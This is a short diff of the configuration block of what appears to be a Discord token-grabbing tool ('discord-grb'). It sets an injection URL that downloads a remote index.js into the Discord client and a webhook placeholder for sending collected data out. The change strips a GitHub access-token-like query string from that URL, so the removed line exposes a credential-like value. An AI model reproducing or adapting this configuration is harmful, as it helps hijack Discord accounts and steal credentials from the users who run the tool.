@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/HLD1KS/discord-grb/main/index.js?token=GHSAT0AAAAAACC5GI26RUQLO3CPZS3R26NSZDKAT2A",
+    injection_url: "https://raw.githubusercontent.com/HLD1KS/discord-grb/main/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
